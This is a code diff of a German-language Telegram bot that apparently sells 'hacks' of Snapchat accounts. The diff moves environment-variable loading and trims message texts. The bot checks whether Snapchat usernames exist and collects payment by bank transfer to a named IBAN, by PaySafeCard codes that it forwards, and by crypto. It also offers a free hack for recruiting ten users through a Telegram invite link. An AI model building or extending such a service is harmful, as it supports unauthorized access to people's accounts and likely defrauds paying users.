@@ -23,6 +23,19 @@ from telegram.ext import (
 )
 from telegram.constants import ParseMode
 
+# ✅ Umgebungsvariablen einmalig laden
+TOKEN = os.getenv("TOKEN")
+CHANNEL_ID = os.getenv("CHANNEL_ID")
+ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
+
+if not TOKEN:
+    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
+if not CHANNEL_ID or not ADMIN_CHAT_ID:
+    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")
+
+CHANNEL_ID = int(CHANNEL_ID)
+ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
+
 app = Flask('')
 
 @app.route('/')
@@ -33,7 +46,6 @@ def keep_alive():
     port = int(os.environ.get("PORT", 8080))
     Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
 
-# Session-Variable für Paysafe-Code-Sendung
 user_paysafe_sent = set()
 
 def check_snapchat_username_exists_and_get_name(username: str):
@@ -143,16 +155,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Empfänger: Euro Hunter\n"
             "IBAN: <code>IE50 PPSE 9903 8024 4830 33</code>\n"
             "BIC: <code>PPSEIE22XXX</code>\n\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs.\n"
-            "Wichtig: Gib im Verwendungszweck deinen Telegram-Benutzernamen an."
+            "Bitte sende hier ein Foto deines Zahlungsbelegs."
         )
     elif cmd == "pay_paysafe":
         text = (
             "💳 <b>PaySafeCard</b>\n\n"
             "Bitte sende deinen 16-stelligen PaySafe-Code im Format:\n"
             "<code>0000-0000-0000-0000</code>\n\n"
-            "Der Code wird überprüft und weitergeleitet.\n"
-            "Bitte warte nach dem Senden auf die Bestätigung."
+            "Der Code wird überprüft und weitergeleitet."
         )
     elif cmd == "pay_crypto":
         text = (
@@ -174,8 +184,7 @@ async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🎁 <b>Lade Freunde ein und erhalte einen kostenlosen Hack!</b>\n\n"
         "Du bekommst <b>einen Hack gratis</b>, wenn du <b>10 neue Personen</b> über deinen Link einlädst:\n\n"
-        "🔗 https://t.me/+xSnJBwXX-g05Yjcy\n\n"
-        "Wenn jemand über deinen Link den Bot benutzt, zählt es als gültige Einladung."
+        "🔗 https://t.me/+xSnJBwXX-g05Yjcy"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
@@ -237,19 +246,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Unbekannter Befehl. Nutze /hack, /pay oder sende Beweise als Foto.")
 
 def main():
-    TOKEN = os.getenv("TOKEN")
-    print("📦 TOKEN aus Umgebungsvariable:", repr(TOKEN))  # NEU
-
-    if not TOKEN:
-        raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt oder ist leer!")
-
-    global CHANNEL_ID, ADMIN_CHAT_ID
-    try:
-        CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
-        ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))
-    except Exception as e:
-        raise ValueError("❌ CHANNEL_ID oder ADMIN_CHAT_ID fehlen oder sind ungültig!")
-
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
